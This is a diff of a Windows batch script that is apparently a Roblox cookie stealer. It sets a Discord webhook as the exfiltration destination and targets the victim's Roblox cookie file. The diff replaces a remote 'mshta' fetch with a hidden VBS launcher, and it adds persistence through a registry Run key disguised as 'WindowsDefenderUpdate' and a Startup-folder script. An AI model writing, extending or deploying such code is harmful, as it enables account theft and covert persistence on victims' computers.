@@ -6,10 +6,19 @@ set "ONLINE=https://discord.com/api/webhooks/1563118517958746183/MkkFXgq5RRDWp-E
 set "PC=%COMPUTERNAME%"
 set "USER=%USERNAME%"
 set "RC=%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat"
+set "MY_PATH=%~dp0%~nx0"
 
-echo Setting up persistence...
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "mshta https://dicerigs.onrender.com/check" /f >nul
-echo CreateObject("WScript.Shell").Run "mshta https://dicerigs.onrender.com/check", 0, False > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
+:: --- PERSISTENCE SETUP ---
+:: Create a VBS wrapper that hides the command prompt when it runs the batch file on startup
+echo Set WShell = CreateObject("WScript.Shell") > "%TEMP%\vanta_launch.vbs"
+echo WShell.Run """%~dp0%~nx0""", 0, False >> "%TEMP%\vanta_launch.vbs"
+
+:: 1. Drop into Registry Run
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "wscript.exe //B \"%TEMP%\vanta_launch.vbs\"" /f >nul
+
+:: 2. Drop into Startup Folder
+copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs" >nul
+:: --------------------------
 
 echo Sending initial logs...
 if exist "%RC%" (
